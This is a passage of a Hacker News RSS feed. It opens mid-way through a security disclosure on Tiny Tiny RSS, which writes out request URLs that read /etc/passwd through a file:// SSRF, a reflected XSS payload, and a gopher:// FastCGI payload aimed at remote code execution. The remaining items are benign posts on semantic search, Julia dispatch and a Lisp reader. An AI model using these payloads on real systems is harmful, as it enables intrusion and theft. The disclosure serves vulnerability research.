a custom function written by tt-rss developers. If <code>libcurl</code> is installed, it uses it to fetch content from the requested URL (if <code>libcurl</code> is not installed, it uses <code>file_get_contents</code>). Plenty of protocols are supported by <code>libcurl</code>, including <code>file://</code>, again we noticed no filtering or enforcing that URL needs to be HTTP URL. JThus we figured reading local files must be possible.</p><p>First attempt failed:<br><code>/public.php?op=pluginhandler&amp;plugin=af_proxy_http&amp;pmethod=imgproxy&amp;url=file:///etc/passwd</code></p><figure><img src="https://www.digeex.de/content/images/2020/09/ec2a357b91a9c73101abe05c18c63154.png" alt="ec2a357b91a9c73101abe05c18c63154"></figure><p>It failed because the file will be stored in cache only if <code>libcurl</code> gets HTTP response code 200; alternatively, it shows an error image.</p><p>However, file contents can still be seen. For some reason, the plugin also has an alternative way of showing errors that can be used to get file contents. All that needs to be done to trigger it is add the <code>text</code> parameter.</p><p><code>/public.php?op=pluginhandler&amp;plugin=af_proxy_http&amp;pmethod=imgproxy&amp;url=file:///etc/passwd&amp;text=1</code></p><figure><img src="https://www.digeex.de/content/images/2020/09/Screenshot_2020-09-10-Screenshot.png" alt="Screenshot_2020-09-10-Screenshot"></figure><p>As with SSRF, an attacker can pair this vulnerability with reflected XSS and extract sensitive files' contents.</p><p>This vulnerability has been asigned <a href="https://nvd.nist.gov/vuln/detail/CVE-2020-25787">CVE-2020-25787</a> by the MITRE corporation.</p><h3 id="another-xss">Another XSS</h3><p>For completion's sake, let's mention that <code>url</code> parameter is also vulnerable to reflected XSS when used in conjunction with the text parameter.</p><p><code>/public.php?op=pluginhandler&amp;plugin=af_proxy_http&amp;pmethod=imgproxy&amp;url=&lt;script&gt;alert(1)&lt;/script&gt;&amp;text=1</code></p><figure><img src="https://www.digeex.de/content/images/2020/09/8ba4ac8dd07d0a6021a8836143b11922.png" alt="8ba4ac8dd07d0a6021a8836143b11922"></figure><p>To keep track of this vulnerability, <a href="https://nvd.nist.gov/vuln/detail/CVE-2020-25788">CVE-2020-25788</a> was assigned.</p><h2 id="escalating-to-remote-code-execution">Escalating to remote code execution</h2><p>Our goal from the start was to discover a RCE vulnerability. Classic LFI to RCE escalation was not applicable, as with that vulnerability, we could only read PHP code, not execute it.</p><p>After we analyzed other parts of an application and failing to find RCE (other than one in <a href="https://www.exploit-db.com/exploits/40154">outdated PHP gettext</a> library which would require the attacker to modify translation files), we returned to <code>af_proxy_http</code> plugin.</p><p>We planned to see if it is realistic to escalate SSRF to RCE through something commonly installed along the tt-rss.</p><p>We came across <a href="https://github.com/tarunkant/Gopherus">gopherus</a> tool which describes itself as tool that generates gopher link for exploiting SSRF and gaining RCE in various servers. <code>libcurl</code> supports plenty of protocols; Gopher is particularly useful for an attacker cause it can be used to craft custom TCP packets.</p><p>By examining <a href="https://git.tt-rss.org/fox/ttrss-docker-compose">docker files</a> (docker is the recommended way of installing tt-rss at the time of writing), we concluded PHP-FPM running on port 9000 is the best attack vector. We ran gopherus to generate payload (gopher URL), it is relatively easy to run it. All attacker needs to know is the location of any PHP file on a remote system (on non-dockerized installation we were testing on we chose <code>/srv/http/tt-rss/config.php</code>). First attempt failed. After some troubleshooting we realized payload needs to be double url encoded (without double encoding, raw null bytes were passed to <code>curl_exec</code>). Following that, we ran it...and it failed again, this time without clear reason.</p><figure><img src="https://www.digeex.de/content/images/2020/09/45d612473af47eb737a145da667d8619.png" alt="" srcset="https://www.digeex.de/content/images/size/w600/2020/09/45d612473af47eb737a145da667d8619.png 600w, https://www.digeex.de/content/images/size/w1000/2020/09/45d612473af47eb737a145da667d8619.png 1000w, https://www.digeex.de/content/images/2020/09/45d612473af47eb737a145da667d8619.png 1335w" sizes="(min-width: 720px) 720px"><figcaption>./gopherus.py --exploit fastcgi (modified so it double-encodes)</figcaption></figure><p>We ssh'd to the box tt-rss was running on and tried to make the request manually (this time URL is not double-encoded cause it's not processed twice).</p><pre><code>curl gopher://localhost:9000/_%01%01%00%01%00%08%00%00%00%01%00%00%00%00%00%00%01%04%00%01%01%08%00%00%0F%10SERVER_SOFTWAREgo%20/%20fcgiclien%20%0%09REMOTE_ADDR127.0.0.1%0F%08SERVER_PROTOCOLHTTP/1.1%0E%02CONTENT_LENGTH92%0E%04REQUEST_METHODPOST%09KPHP_VALUEallow_url_include%20%3D%20On%0Adisable_functions%20%3D%20%0Aauto_prepend_file%20%3D%20php%3A//input%0F%1BSCRIPT_FILENAME/srv/http/tt-rss/public.php%0D%01DOCUMENT_ROOT/%01%04%00%01%00%00%00%00%01%05%00%01%00%5C%04%00%3C%3Fphp%20system%28%27ls%20%3E%20/srv/http/tt-rss/cache/images/a.txt%27%29%3Bdie%28%27-----Made-by-SpyD3r-----%0A%27%29%3B%3F%3E%00%00%00%00
</code></pre><p>Result was <code>curl: (3) URL using bad/illegal format or missing URL</code>.</p><p><a href="https://github.com/curl/curl/commit/31e53584db5879894809fbde5445aac7553ac3e2#diff-5af1b0638bb439638b199b389467edbd">This commit</a> reveals the problem. tt-rss was self-hosted on an ‚Ä¶</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.digeex.de/blog/tinytinyrss/">https://www.digeex.de/blog/tinytinyrss/</a></em></p>]]>
            </description>
            <link>https://www.digeex.de/blog/tinytinyrss/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24580672</guid>
            <pubDate>Thu, 24 Sep 2020 16:51:34 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[What Is Semantic Search?]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24580514">thread link</a>) | @danial
<br/>
September 24, 2020 | https://www.traindex.io/blog/what-is-semantic-search-3612 | <a href="https://web.archive.org/web/*/https://www.traindex.io/blog/what-is-semantic-search-3612">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><p>How many times have you had a song's lyrics stuck in your head? Or wanted to search about something but don't know how to describe it? We all have gone through these scenarios in our lives. Who was always there to save the day? Yes, the internet! The power of modern search engines to search through vast amounts of information is unquestionable. They search through billions of webpages on the internet to give you what you need. Like searching for a needle in a haystack except sometimes, users cannot describe the needle.</p>

<p>Retrieving relevant information from an extensive collection of documents is a challenge. Techniques like syntax analysis, string matching, KPS (Keyword, Pattern, Sample) Search, Semantic Search, etc. have their own merits. Yet, semantic search is superior.</p>

<h2>
  <a name="why-semantic-search" href="https://dev.to/#why-semantic-search" target="__blank">
  </a>
  Why Semantic Search?
</h2>

<p>Semantic search is a searching technique that improves the accuracy or relevance of the results. It does this by understanding the user's intent through contextual meaning. It answers questions that are not present in the search space. It can also provide personalized search results based on different factors. Semantic search finds that forgotten song's lyrics and also searches important documents from your vast collection of corporate data.</p>

<h3>
  <a name="relevant-results" href="https://dev.to/#relevant-results" target="__blank">
  </a>
  Relevant Results
</h3>

<p>Modern, powerful Machine Learning and Natural Language Processing algorithms enable the search engine to "understand" what the user has asked. The search engine analyzes entities in sentences, inter-dependence of words, synonyms, context. Sometimes it analyzes other factors, such as the browser history of web search engines. This allows users to get accurate results. </p>

<h3>
  <a name="better-user-experience" href="https://dev.to/#better-user-experience" target="__blank">
  </a>
  Better User Experience
</h3>

<p>Getting accurate information at a fast pace results in better user experience. Semantic search is quick and accurate resulting in better user experience.</p>

<h3>
  <a name="discover-knowledge" href="https://dev.to/#discover-knowledge" target="__blank">
  </a>
  Discover Knowledge
</h3>

<p>Unlike keyword search, semantic search aims to understand the user's query and intent. It is likely to get results with the same concepts and ideas. It can help discover new things about the same topics, which can be very useful. Also, in a corporate setting, semantic search can help enhance business intelligence. For example, a keyword search from the resume database will take keywords like "python" AND "machine learning," etc., and find resumes that only have those keywords. But, semantic search can take input like "machine learning python" and provide the resumes with these terms and the resumes with similar ideas but don't have the same words.</p>

<h2>
  <a name="traindex-and-semantic-search" href="https://dev.to/#traindex-and-semantic-search" target="__blank">
  </a>
  Traindex and Semantic Search
</h2>

<p>We understand the importance of semantic search, especially in corporate settings. Traindex implements semantic search solutions for your data collection doesn't matter what it is. To understand how we do it, consider the example of a library. A library can have thousands of books, yet a librarian can tell you exactly where a particular book is. How is the librarian able to do so? By using topical indexes. Libraries divide books into topics. Each subject has its space, and the location of these doesn't change. The librarian can point you towards a specific book, it's the exact location. Traindex implements a semantic search and uses various machine learning and NLP algorithms to learn the topics and maintain an index for fast lookups. It can search for a wide variety of data from corporate resume data to patent data and other critical corporate data. We provide secure end-to-end pipelines to implement our solution, so our interaction with your data is minimal.  </p>

<h2>
  <a name="how-to-implement-semantic-search" href="https://dev.to/#how-to-implement-semantic-search" target="__blank">
  </a>
  How to Implement Semantic Search?
</h2>

<p>There are a ton of different techniques and algorithms available to develop a semantic search system. Choosing one of them depends on many factors like the dataset, resources available, urgency, etc. Traindex can implement any of these algorithms according to the requirements. Here are some most common algorithms.</p>

<h3>
  <a name="latent-semantic-indexinglatent-dirichlet-allocation" href="https://dev.to/#latent-semantic-indexinglatent-dirichlet-allocation" target="__blank">
  </a>
  Latent Semantic Indexing/Latent Dirichlet Allocation
</h3>

<p>Both LSI and LDA take a bag of words formatted as a matrix as input. LSI uses SVD, a very popular matrix decomposition technique to find latent dimensions, aka topics from the input. In contrast, LDA is a generative probabilistic model, and it assumes a Dirichlet Prior over the Latent topics. Methods like TF-IDF can be used to make an input matrix, and then LSI and LDA can do their work and figure out the N number of topics from the input. The number of topics is hyper-parameter and can be tuned based on factors such as data size, resource availability, etc. For an incoming query, the model will find the topic that matches the input most, and from that topic, it will find the most relevant results and rank them. </p>

<p><a href="https://res.cloudinary.com/practicaldev/image/fetch/s--scCDYwdC--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/i/n9kjwg3vydplq0f866um.png" target="__blank"><img src="https://res.cloudinary.com/practicaldev/image/fetch/s--scCDYwdC--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/i/n9kjwg3vydplq0f866um.png" alt="LSA" loading="lazy"></a></p>

<h3>
  <a name="word2vecdoc2vec" href="https://dev.to/#word2vecdoc2vec" target="__blank">
  </a>
  Word2Vec/Doc2Vec
</h3>

<p>Word2Vec and Doc2Vec models are embedding techniques that have provided state-of-the-art results in various natural language processing tasks and have acted as a silver bullet for a lot of different NLP problems. The bag of words technique results in a sparse matrix in very high dimensions. In contrast, the idea behind these embedding techniques is to represent the text in a fixed-sized, low-dimensional dense vector, which stores its semantic relationships. They also can learn these representations once and reuse them later. It has proven that embedding works way better than previous techniques. Choosing whether to use word2vec or doc2vec, again, depends on what sort of data you have. You can also use pre-trained embeddings for your semantic search engines.</p>

<p><a href="https://res.cloudinary.com/practicaldev/image/fetch/s--XlVJoBW2--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/i/865jrrcno76ico5ec0zj.png" target="__blank"><img src="https://res.cloudinary.com/practicaldev/image/fetch/s--XlVJoBW2--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/i/865jrrcno76ico5ec0zj.png" alt="w2v_d2v" loading="lazy"></a></p>

<h3>
  <a name="transformer-language-models" href="https://dev.to/#transformer-language-models" target="__blank">
  </a>
  Transformer Language Models
</h3>

<p>Transformers are deep learning models that encounter the problems of long-range dependencies and long training times in traditional models like RNNs, LSTMs, etc. They are parallelable and can address a wide range of NLP tasks through fine-tuning. They have been giving back to back SOTA results recently. Some common transformer models used these days are BERT, GPT-2, GPT-3, XLNet, Reformer, RoBERTa, etc. Although most of these models are generative, you can use them for your semantic search systems by fine-tuning them or using them to generate embeddings for your text. </p>

<h2>
  <a name="take-away" href="https://dev.to/#take-away" target="__blank">
  </a>
  Take Away
</h2>

<p>Searching for useful and relevant information from an extensive collection of text-based documents is arduous. Semantic search allows us to do so smartly. Search engines already do so, and Traindex can provide you with your very own custom semantic search system based on your data. Sounds amazing? Click <a href="https://www.traindex.io/" target="__blank">here</a> to request a demo. </p>

</div></div></div>]]>
            </description>
            <link>https://www.traindex.io/blog/what-is-semantic-search-3612</link>
            <guid isPermaLink="false">hacker-news-small-sites-24580514</guid>
            <pubDate>Thu, 24 Sep 2020 16:40:11 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The missing harm of manual dispatch in Julia]]>
            </title>
            <description>
<![CDATA[
Score 95 | Comments 28 (<a href="https://news.ycombinator.com/item?id=24580479">thread link</a>) | @amkkma
<br/>
September 24, 2020 | https://andreaskroepelin.de/blog/manual_dispatch/ | <a href="https://web.archive.org/web/*/https://andreaskroepelin.de/blog/manual_dispatch/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
            <p>Just a short one today:
New users of Julia coming from other dynamically typed languages might write functions like</p>
<div><pre><code data-lang="julia"><span>function</span> <span>foo</span><span>(</span><span>x</span><span>)</span>
    <span>if</span> <span>x</span> <span>isa</span> <span>Int</span>
        <span>x</span> <span>+</span> <span>x</span>
    <span>elseif</span> <span>x</span> <span>isa</span> <span>Float64</span>
        <span>x</span> <span>/</span> <span>2.0</span>
    <span>elseif</span> <span>x</span> <span>isa</span> <span>String</span>
        <span>length</span><span>(</span><span>x</span><span>)</span>
    <span>else</span>
        <span>1</span>
    <span>end</span>
<span>end</span>
</code></pre></div><p>This is clearly unidiomatic and should be written as</p>
<div><pre><code data-lang="julia"><span>bar</span><span>(</span><span>x</span><span>::</span><span>Int</span><span>)</span> <span>=</span> <span>x</span> <span>+</span> <span>x</span>
<span>bar</span><span>(</span><span>x</span><span>::</span><span>Float64</span><span>)</span> <span>=</span> <span>x</span> <span>/</span> <span>2.0</span>
<span>bar</span><span>(</span><span>x</span><span>::</span><span>String</span><span>)</span> <span>=</span> <span>length</span><span>(</span><span>x</span><span>)</span>
<span>bar</span><span>(</span><span>x</span><span>)</span> <span>=</span> <span>1</span> <span># or bar(x::Any), to be explicit</span>
</code></pre></div><p>because it is nicer to read and very easy to extend for other types of <code>x</code>.
Well, you technically can extend <code>foo</code> the same way as <code>bar</code>, but reading the definition of <code>foo</code> one would expect to then know its complete behavior, so it would be misleading.</p>
<p><em>However</em>, my point is that there is actually (maybe surprisingly) no harm at runtime for code as in <code>foo</code>!
The Julia compiler isn‚Äôt tricked that easily and will still produce optimal machine code for each type of the argument:</p>
<div><pre><code data-lang="julia"><span>julia</span><span>&gt;</span> <span>@code_native</span> <span>debuginfo</span><span>=:</span><span>none</span> <span>bar</span><span>(</span><span>1</span><span>)</span>
    <span>.</span><span>text</span>
    <span>leaq</span>	<span>(</span><span>%</span><span>rdi</span><span>,</span><span>%</span><span>rdi</span><span>),</span> <span>%</span><span>rax</span>
    <span>retq</span>
    <span>nopw</span>	<span>%</span><span>cs</span><span>:</span><span>(</span><span>%</span><span>rax</span><span>,</span><span>%</span><span>rax</span><span>)</span>

<span>julia</span><span>&gt;</span> <span>@code_native</span> <span>debuginfo</span><span>=:</span><span>none</span> <span>foo</span><span>(</span><span>1</span><span>)</span>
    <span>.</span><span>text</span>
    <span>leaq</span>	<span>(</span><span>%</span><span>rdi</span><span>,</span><span>%</span><span>rdi</span><span>),</span> <span>%</span><span>rax</span>
    <span>retq</span>
    <span>nopw</span>	<span>%</span><span>cs</span><span>:</span><span>(</span><span>%</span><span>rax</span><span>,</span><span>%</span><span>rax</span><span>)</span>
</code></pre></div><p>Both functions basically compile down to a single adding instruction (<code>leaq</code>; <code>retq</code> is for returning from the function and <code>nopw</code> is an operation that does nothing and is there for <a href="https://en.wikipedia.org/wiki/NOP_%28code%29%23Machine_language_instructions">technical reasons</a>).
Think about it this way:
When Julia compiles <code>foo(1)</code>, it knows that <code>1</code> is of type <code>Int</code>, can evaluate the <code>x isa Int</code> expression at compile time to <code>true</code>, and discard everything but the <code>x + x</code> without a problem.</p>
<h2 id="appendix">‚ÄúAppendix‚Äù</h2>
<p>For completeness, here is what‚Äôs produced in the other cases:</p>
<div><pre><code data-lang="julia"><span>julia</span><span>&gt;</span> <span>@code_native</span> <span>debuginfo</span><span>=:</span><span>none</span> <span>bar</span><span>(</span><span>1.0</span><span>)</span>
    <span>.</span><span>text</span>
    <span>movabsq</span>	<span>$</span><span>140581530607976</span><span>,</span> <span>%</span><span>rax</span>  <span># imm = 0x7FDBB031A168</span>
    <span>vmulsd</span>	<span>(</span><span>%</span><span>rax</span><span>),</span> <span>%</span><span>xmm0</span><span>,</span> <span>%</span><span>xmm0</span>
    <span>retq</span>
    <span>nop</span>

<span>julia</span><span>&gt;</span> <span>@code_native</span> <span>debuginfo</span><span>=:</span><span>none</span> <span>foo</span><span>(</span><span>1.0</span><span>)</span>
    <span>.</span><span>text</span>
    <span>movabsq</span>	<span>$</span><span>140581530608088</span><span>,</span> <span>%</span><span>rax</span>  <span># imm = 0x7FDBB031A1D8</span>
    <span>vmulsd</span>	<span>(</span><span>%</span><span>rax</span><span>),</span> <span>%</span><span>xmm0</span><span>,</span> <span>%</span><span>xmm0</span>
    <span>retq</span>
    <span>nop</span>


<span>julia</span><span>&gt;</span> <span>@code_native</span> <span>debuginfo</span><span>=:</span><span>none</span> <span>bar</span><span>(</span><span>"abc"</span><span>)</span>
    <span>.</span><span>text</span>
    <span>pushq</span>	<span>%</span><span>rax</span>
    <span>movabsq</span>	<span>$</span><span>"ncodeunits;"</span><span>,</span> <span>%</span><span>rax</span>
    <span>callq</span>	<span>*%</span><span>rax</span>
    <span>popq</span>	<span>%</span><span>rcx</span>
    <span>retq</span>
    <span>nop</span>

<span>julia</span><span>&gt;</span> <span>@code_native</span> <span>debuginfo</span><span>=:</span><span>none</span> <span>foo</span><span>(</span><span>"abc"</span><span>)</span>
    <span>.</span><span>text</span>
    <span>pushq</span>	<span>%</span><span>rax</span>
    <span>movabsq</span>	<span>$</span><span>"ncodeunits;"</span><span>,</span> <span>%</span><span>rax</span>
    <span>callq</span>	<span>*%</span><span>rax</span>
    <span>popq</span>	<span>%</span><span>rcx</span>
    <span>retq</span>
    <span>nop</span>


<span>julia</span><span>&gt;</span> <span>@code_native</span> <span>debuginfo</span><span>=:</span><span>none</span> <span>bar</span><span>([])</span>
    <span>.</span><span>text</span>
    <span>movl</span>	<span>$</span><span>1</span><span>,</span> <span>%</span><span>eax</span>
    <span>retq</span>
    <span>nopw</span>	<span>%</span><span>cs</span><span>:</span><span>(</span><span>%</span><span>rax</span><span>,</span><span>%</span><span>rax</span><span>)</span>

<span>julia</span><span>&gt;</span> <span>@code_native</span> <span>debuginfo</span><span>=:</span><span>none</span> <span>foo</span><span>([])</span>
    <span>.</span><span>text</span>
    <span>movl</span>	<span>$</span><span>1</span><span>,</span> <span>%</span><span>eax</span>
    <span>retq</span>
    <span>nopw</span>	<span>%</span><span>cs</span><span>:</span><span>(</span><span>%</span><span>rax</span><span>,</span><span>%</span><span>rax</span><span>)</span>
</code></pre></div>
        </div></div>]]>
            </description>
            <link>https://andreaskroepelin.de/blog/manual_dispatch/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24580479</guid>
            <pubDate>Thu, 24 Sep 2020 16:36:57 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Compiling a Lisp: Reader]]>
            </title>
            <description>
<![CDATA[
Score 109 | Comments 26 (<a href="https://news.ycombinator.com/item?id=24580453">thread link</a>) | @azhenley
<br/>
September 24, 2020 | https://bernsteinbear.com/blog/compiling-a-lisp-6/ | <a href="https://web.archive.org/web/*/https://bernsteinbear.com/blog/compiling-a-lisp-6/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
            <p><em><a href="https://bernsteinbear.com/blog/compiling-a-lisp-0/">first</a></em> ‚Äì <em><a href="https://bernsteinbear.com/blog/compiling-a-lisp-5/">previous</a></em></p>

<p>Welcome back to the ‚ÄúCompiling a Lisp‚Äù series. This time I want to take a break
from compiling and finally add a <em>reader</em>. I‚Äôm finally getting frustrated
manually entering increasinly complicated ASTs, so I figure it is time. After
this post, we‚Äôll be able to type in programs like:</p>



<p>and have our compiler make ASTs for us! Magic. This will also add some nice
debugging tools for us. For example, imagine an interactive command line
utility in which we can enter Lisp expressions and the compiler prints out
human-readable assembly (and hex? maybe?). It could even run the code, too.
Check out this imaginary demo:</p>

<div><div><pre><code>lisp&gt; 1
; mov rax, 0x4
=&gt; 1
lisp&gt; (add1 1)
; mov rax, 0x4
; add rax, 0x4
=&gt; 2
lisp&gt;
</code></pre></div></div>

<p>Wow, what a thought.</p>

<h3 id="the-reader-interface">The Reader interface</h3>

<p>To make this interface as simple and testable as possible, I want the reader
interface to take in a C string and return an <code>ASTNode *</code>:</p>

<div><div><pre><code><span>ASTNode</span> <span>*</span><span>Reader_read</span><span>(</span><span>char</span> <span>*</span><span>input</span><span>);</span>
</code></pre></div></div>

<p>We can add interfaces later to support reading from a <code>FILE*</code> or file
descriptor or something, but for now we‚Äôll just use strings and line-based
input.</p>

<p>On success, we‚Äôll return a fully-formed <code>ASTNode*</code>. But on error, well, hold
on. We can‚Äôt just return <code>NULL</code>. On many platforms, <code>NULL</code> is defined to be
<code>0</code>, which is how we encode the integer <code>0</code>. On others, it could be defined to
be <code>0x55555555</code><sup id="fnref:1" role="doc-noteref"><a href="#fn:1">1</a></sup> or something equally silly. Regardless, its value might
overlap with our type encoding scheme in some unintended way.</p>

<p>This means that we have to go ahead and add another immediate object: an
<code>Error</code> object. We have some open immediate tag bits, so sure, why not. We can
also use this to signal runtime errors and other fun things. It‚Äôll probably be
useful.</p>

<h3 id="the-error-object">The Error object</h3>

<p>Back to the object tag diagram. Below I have reproduced the tag diagram from
previous posts, but now with a new entry (denoted by <code>&lt;-</code>). This new entry
shows the encoding for the canonical <code>Error</code> object.</p>

<div><div><pre><code>High							     Low
XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX00  Integer
0000000000000000000000000000000000000000000000000XXXXXXX00001111  Character
00000000000000000000000000000000000000000000000000000000X0011111  Boolean
0000000000000000000000000000000000000000000000000000000000101111  Nil
0000000000000000000000000000000000000000000000000000000000111111  Error &lt;-
XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX001  Pair
XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX010  Vector
XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX011  String
XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX101  Symbol
XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX110  Closure
</code></pre></div></div>

<p>If we wanted to, we could even add additional tag bits to the (currently all 0)
payload, to signal different kinds of errors. Maybe later. For now, we add a
tag constant and associated <code>Object</code> and <code>AST</code> functions:</p>

<div><div><pre><code><span>const</span> <span>unsigned</span> <span>int</span> <span>kErrorTag</span> <span>=</span> <span>0x3f</span><span>;</span> <span>// 0b111111</span>
<span>uword</span> <span>Object_error</span><span>()</span> <span>{</span> <span>return</span> <span>kErrorTag</span><span>;</span> <span>}</span>

<span>bool</span> <span>AST_is_error</span><span>(</span><span>ASTNode</span> <span>*</span><span>node</span><span>)</span> <span>{</span> <span>return</span> <span>(</span><span>uword</span><span>)</span><span>node</span> <span>==</span> <span>Object_error</span><span>();</span> <span>}</span>
<span>ASTNode</span> <span>*</span><span>AST_error</span><span>()</span> <span>{</span> <span>return</span> <span>(</span><span>ASTNode</span> <span>*</span><span>)</span><span>Object_error</span><span>();</span> <span>}</span>
</code></pre></div></div>

<p>That should be enough to get us going for now. Perhaps we could even convert
our <code>Compile_</code> suite of functions to use this object instead of an <code>int</code>. It
would certainly be more informative. Maybe in a future post.</p>

<h3 id="language-syntax">Language syntax</h3>

<p>Let‚Äôs get back to business and think about what we want our language to look
like. This is a Lisp series but really you could adapt your reader to read any
sort of syntax. No need for parentheses if you‚Äôre allergic.</p>

<p>I‚Äôm going to use this simple Lisp reader because it‚Äôs short and simple, so
we‚Äôll have some parens.</p>

<p>First, our integers will look like integers in most languages ‚Äî <code>0</code>, <code>123</code>,
<code>-123</code>.</p>

<p>You can add support for other bases if you like, but I don‚Äôt plan on it here.</p>

<p>Second, our characters will look like C characters ‚Äî <code>'a'</code>, <code>'b'</code>, etc. Some
implementations opt for <code>#'a</code> but that has always looked funky to me.</p>

<p>Third, our booleans will be <code>#t</code> and <code>#f</code>. You‚Äôre also welcome to go ahead and
use symbols to represent the names, avoid special syntax, and have those
symbols evaluate to truthy and falsey values.</p>

<p>Fourth, the nil object will be <code>()</code>. We can also later bind the symbol <code>nil</code> to
mean <code>()</code>, too.</p>

<p>I‚Äôm going to skip error objects, because they don‚Äôt yet have any sort of
user-land meaning yet ‚Äî they‚Äôre just used in compiler infrastructure right
now.</p>

<p>Fifth, pairs will look like <code>(1 2 3)</code>, meaning <code>(cons 1 (cons 2 (cons 3
nil)))</code>. I don‚Äôt plan on adding support for dotted pair syntax. Whitespace will
be insignificant.</p>

<p>Sixth, symbols will look like any old ASCII identifier: <code>hello</code>, <code>world</code>,
<code>fooBar</code>. I‚Äôll also include some punctuation in there, too, so we can use <code>+</code>
and <code>-</code> as symbols, for example. Or we could even go full Lisp and use
<code>train-case</code> identifiers.</p>

<p>I‚Äôm going to skip closures, since they don‚Äôt have a syntactic representation
‚Äî they are just objects known to the runtime. Vectors and strings don‚Äôt have
any implementation right now so we‚Äôll add those to the reader later.</p>

<p>That‚Äôs it! Key points are: mind your plus and minus signs since they can appear
in both integers and symbols; don‚Äôt read off the end; have fun.</p>

<h3 id="the-reader-implementation">The Reader implementation</h3>

<p>Now that we‚Äôve rather informally specified what our language looks like, we can
write a small reader. We‚Äôll start with the <code>Reader_read</code> function from above.</p>

<p>This function will just be a shell around an internal function with some more
parameters.</p>

<div><div><pre><code><span>ASTNode</span> <span>*</span><span>Reader_read</span><span>(</span><span>char</span> <span>*</span><span>input</span><span>)</span> <span>{</span>
  <span>word</span> <span>pos</span> <span>=</span> <span>0</span><span>;</span>
  <span>return</span> <span>read_rec</span><span>(</span><span>input</span><span>,</span> <span>&amp;</span><span>pos</span><span>);</span>
<span>}</span>
</code></pre></div></div>

<p>This is because we need to carry around some more state to read through this
string. We need to know how far into the string we are. I chose to use an
additional <code>word</code> for the index. Some might prefer a <code>char**</code> instead. Up to
you.</p>

<p>With any recursive reader invocation, we should advance through all the
whitespace, because it doesn‚Äôt mean anything to us. For this reason, we have a
handy-dandy <code>skip_whitespace</code> function that reads through all the whitespace
and then returns the next non-whitespace character.</p>

<div><div><pre><code><span>void</span> <span>advance</span><span>(</span><span>word</span> <span>*</span><span>pos</span><span>)</span> <span>{</span> <span>++*</span><span>pos</span><span>;</span> <span>}</span>

<span>char</span> <span>next</span><span>(</span><span>char</span> <span>*</span><span>input</span><span>,</span> <span>word</span> <span>*</span><span>pos</span><span>)</span> <span>{</span>
  <span>advance</span><span>(</span><span>pos</span><span>);</span>
  <span>return</span> <span>input</span><span>[</span><span>*</span><span>pos</span><span>];</span>
<span>}</span>

<span>char</span> <span>skip_whitespace</span><span>(</span><span>char</span> <span>*</span><span>input</span><span>,</span> <span>word</span> <span>*</span><span>pos</span><span>)</span> <span>{</span>
  <span>char</span> <span>c</span> <span>=</span> <span>'\0'</span><span>;</span>
  <span>for</span> <span>(</span><span>c</span> <span>=</span> <span>input</span><span>[</span><span>*</span><span>pos</span><span>];</span> <span>isspace</span><span>(</span><span>c</span><span>);</span> <span>c</span> <span>=</span> <span>next</span><span>(</span><span>input</span><span>,</span> <span>pos</span><span>))</span> <span>{</span>
    <span>;</span>
  <span>}</span>
  <span>return</span> <span>c</span><span>;</span>
<span>}</span>
</code></pre></div></div>

<p>We can use <code>skip_whitespace</code> in the <code>read_rec</code> function to fetch the next
non-whitespace character. Then we‚Äôll use that character (and sometimes the
following one, too) to determine what structure we‚Äôre about to read.</p>

<div><div><pre><code><span>bool</span> <span>starts_symbol</span><span>(</span><span>char</span> <span>c</span><span>)</span> <span>{</span>
  <span>switch</span> <span>(</span><span>c</span><span>)</span> <span>{</span>
  <span>case</span> <span>'+'</span><span>:</span>
  <span>case</span> <span>'-'</span><span>:</span>
  <span>case</span> <span>'*'</span><span>:</span>
  <span>case</span> <span>'&gt;'</span><span>:</span>
  <span>case</span> <span>'='</span><span>:</span>
  <span>case</span> <span>'?'</span><span>:</span>
    <span>return</span> <span>true</span><span>;</span>
  <span>default:</span>
    <span>return</span> <span>isalpha</span><span>(</span><span>c</span><span>);</span>
  <span>}</span>
<span>}</span>

<span>ASTNode</span> <span>*</span><span>read_rec</span><span>(</span><span>char</span> <span>*</span><span>input</span><span>,</span> <span>word</span> <span>*</span><span>pos</span><span>)</span> <span>{</span>
  <span>char</span> <span>c</span> <span>=</span> <span>skip_whitespace</span><span>(</span><span>input</span><span>,</span> <span>pos</span><span>);</span>
  <span>if</span> <span>(</span><span>isdigit</span><span>(</span><span>c</span><span>))</span> <span>{</span>
    <span>return</span> <span>read_integer</span><span>(</span><span>input</span><span>,</span> <span>pos</span><span>,</span> <span>/*sign=*/</span><span>1</span><span>);</span>
  <span>}</span>
  <span>if</span> <span>(</span><span>c</span> <span>==</span> <span>'+'</span> <span>&amp;&amp;</span> <span>isdigit</span><span>(</span><span>input</span><span>[</span><span>*</span><span>pos</span> <span>+</span> <span>1</span><span>]))</span> <span>{</span>
    <span>advance</span><span>(</span><span>pos</span><span>);</span> <span>// skip '+'</span>
